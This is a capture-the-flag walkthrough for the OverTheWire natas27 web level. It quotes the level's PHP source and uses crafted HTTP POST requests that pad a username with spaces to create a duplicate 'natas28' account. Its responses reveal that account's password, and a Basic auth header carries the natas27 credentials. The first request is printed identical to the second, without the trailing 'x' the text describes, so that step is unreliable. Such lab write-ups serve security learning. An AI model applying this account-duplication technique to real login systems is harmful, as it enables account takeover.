- So in this level we need to do some bruteforcing of the request data as we don't have any scope of injection or exploitation in the regular sense
- Let's have a look at the mimic source code:
```php
<?php
// morla / 10111
// database gets cleared every 5 min
/*
CREATE TABLE `users` (
	`username` varchar(64) DEFAULT NULL,
	`password` varchar(64) DEFAULT NULL
);
*/

function checkCredentials($link,$usr,$pass){
	$user=mysqli_real_escape_string($link, $usr);
	$password=mysqli_real_escape_string($link, $pass);
	$query = "SELECT username from users where username='$user' and password='$password' ";
	$res = mysqli_query($link, $query);
	if(mysqli_num_rows($res) > 0){
		return True;
	}
	return False;
}

function validUser($link,$usr){
	$user=mysqli_real_escape_string($link, $usr);
	$query = "SELECT * from users where username='$user'";
	$res = mysqli_query($link, $query);
	if($res) {
		if(mysqli_num_rows($res) > 0) {
			return True;
		}
	}
	return False;
}

function dumpData($link,$usr){
	$user=mysqli_real_escape_string($link, trim($usr));
	$query = "SELECT * from users where username='$user'";
	$res = mysqli_query($link, $query);
	if($res) {
		if(mysqli_num_rows($res) > 0) {
			while ($row = mysqli_fetch_assoc($res)) {
				// thanks to Gobo for reporting this bug!
				//return print_r($row);
				return print_r($row,true);
			}
		}
	}
	return False;
}

function createUser($link, $usr, $pass){
	if($usr != trim($usr)) {
		echo "Go away hacker";
		return False;
	}
	$user=mysqli_real_escape_string($link, substr($usr, 0, 64));
	$password=mysqli_real_escape_string($link, substr($pass, 0, 64));
	$query = "INSERT INTO users (username,password) values ('$user','$password')";
	$res = mysqli_query($link, $query);
	if(mysqli_affected_rows($link) > 0){
		return True;
	}
	return False;
}

if(array_key_exists("username", $_REQUEST) and array_key_exists("password", $_REQUEST)) {
	$link = mysqli_connect('localhost', 'natas27', '<censored>');
	mysqli_select_db($link, 'natas27');
	if(validUser($link,$_REQUEST["username"])) {
	//user exists, check creds
		if(checkCredentials($link,$_REQUEST["username"],$_REQUEST["password"])){
			echo "Welcome " . htmlentities($_REQUEST["username"]) . "!<br>";
			echo "Here is your data:<br>";
			$data=dumpData($link,$_REQUEST["username"]);
			print htmlentities($data);
		}
		else{
			echo "Wrong password for user: " . htmlentities($_REQUEST["username"]) . "<br>";
		}
	}
	else {
	//user doesn't exist
		if(createUser($link,$_REQUEST["username"],$_REQUEST["password"])){
			echo "User " . htmlentities($_REQUEST["username"]) . " was created!";
		}
	}
mysqli_close($link);
}
?>
```
- Upon going through the code, we can see that this time we cannot do any SQL injection effectively, as the method `mysqli_real_escape_string` encodes the quotes and double quotes, thereby preventing us to end the SQL query string at our will
- So we need to apply a different strategy over here. We can see that the code doesn't check for unique entries in the table, and hence if there are multiple entries with same username, they can be printed easily
- We are interested in the credentials of `natas28`, so if somehow we can create another user with the same name, we can print the one with our intended password too
- So what we can do is the following:
	- Create our own user with the name `natas28`, followed by spaces that would increase the length to 64 characters
	- Send a query with username `natas28`, total length 64 characters. Now during username comparison, MySQL will pad the original `natas28` user entry with spaces, which we have done exactly, and hence it will return the row of original user
- For creating the user, we can use the following username: `natas28                                                         x` (This is 65 characters long, which will get trimmed due to the `substr` function call)
- We can craft the HTTP request as follows:
```http
POST /index.php HTTP/1.1
Host: natas27.natas.labs.overthewire.org
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:131.0) Gecko/20100101 Firefox/131.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 201
Origin: http://natas27.natas.labs.overthewire.org
Authorization: Basic bmF0YXMyNzp1M1JSZmZYanlzamd3RlU2Yjl4YTIzaTZwcm1Vc1luZQ==
Connection: keep-alive
Referer: http://natas27.natas.labs.overthewire.org/
Upgrade-Insecure-Requests: 1
Priority: u=0, i

username=natas28%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20&password=test
```
- Sending this request yields the following response:
```html
<body>
<h1>natas27</h1>
<div id="content">
User natas28                                                         x was created!<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
</body>
```
- This shows that our user was created successfully. Now, we need to just modify our request and remove the trailing `x`. The request can be prepared as follows:
```http
POST /index.php HTTP/1.1
Host: natas27.natas.labs.overthewire.org
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:131.0) Gecko/20100101 Firefox/131.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 201
Origin: http://natas27.natas.labs.overthewire.org
Authorization: Basic bmF0YXMyNzp1M1JSZmZYanlzamd3RlU2Yjl4YTIzaTZwcm1Vc1luZQ==
Connection: keep-alive
Referer: http://natas27.natas.labs.overthewire.org/
Upgrade-Insecure-Requests: 1
Priority: u=0, i

username=natas28%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20&password=test
```
- Now the username is exactly 64 characters long. Firing this request yields the following response:
```html
<div id="content">
Welcome natas28                                                         !<br>Here is your data:<br>Array
(
    [username] =&gt; natas28
    [password] =&gt; 1JNwQM1Oi6J6j1k49Xyw7ZN6pXMQInVj
)
<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
```
- We obtain the password in the page, as expected: 1JNwQM1Oi6J6j1k49Xyw7ZN6pXMQInVj